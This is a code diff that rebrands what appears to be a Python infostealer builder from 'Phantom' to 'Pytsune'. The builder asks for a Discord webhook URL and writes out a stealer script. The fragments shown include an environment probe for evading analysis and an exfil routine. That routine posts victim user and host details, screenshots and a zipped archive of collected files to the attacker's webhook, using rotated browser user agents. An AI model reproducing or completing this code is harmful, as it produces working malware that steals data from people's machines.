@@ -10,7 +10,7 @@ banner = f"""{Fore.BLUE}
                                          
 """
 
-phantomstealertemplate = r'''
+pytsunestealertemplate = r'''
 # © Faith452, 2026
 # ==================================
 # Made by faith452, @y452 on Discord
@@ -31,7 +31,7 @@ try: import pyperclip
 except: pyperclip = None
 
 C2 = "{webhookurlinput}"
-TAG = f"PHANTOM-{random.randint(100000,999999)}-{datetime.date.today().strftime('%y%m%d')}"
+TAG = f"PYTSUNE-{random.randint(100000,999999)}-{datetime.date.today().strftime('%y%m%d')}"
 
 def env_probe():
     if not psutil: return False
@@ -176,7 +176,7 @@ def exfil(data, screen_path):
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
     ])}
     e = {
-        "title": f"Phantom • {data['meta']['tag']}",
+        "title": f"Pytsune • {data['meta']['tag']}",
         "color": 0x0f0f23,
         "fields": [
             {"name": "→ Victim", "value": f"{data['meta']['user']} @ {data['meta']['host']}", "inline": True},
@@ -192,7 +192,7 @@ def exfil(data, screen_path):
     except: pass
 
     for p, n, m, c in [
-        (data.get("screen"), "phantom-s.jpg", "image/jpeg", "Screen"),
+        (data.get("screen"), "pytsune-s.jpg", "image/jpeg", "Screen"),
         (None, None, None, None)
     ]:
         if p and os.path.exists(p):
@@ -222,7 +222,7 @@ def exfil(data, screen_path):
                                     zf.write(fp, f"{cat}/{Path(fp).name}")
             if os.path.getsize(z) < 20*1024*1024:
                 with open(z, "rb") as f:
-                    requests.post(C2, files={"file": ("phantom-arc.zip", f, "application/zip")}, data={"content": "Archive"}, headers=h, timeout=35)
+                    requests.post(C2, files={"file": ("pytsune-arc.zip", f, "application/zip")}, data={"content": "Archive"}, headers=h, timeout=35)
             os.unlink(z)
         except: pass
 
@@ -239,6 +239,6 @@ webhookurlinput = input(f"{Fore.MAGENTA}Enter your Discord Webhook URL (Full URL
 filenameinput = input(f"{Fore.MAGENTA}Enter Output File's Name (Include .py at the end) >> ")
 print(f"{Fore.WHITE}Writing to file..")
 with open(filenameinput, "w", encoding="utf-8") as f:
-    f.write(phantomstealertemplate)
+    f.write(pytsunestealertemplate)
 
 print(f"{Fore.GREEN}[+] {filenameinput} has been generated!")
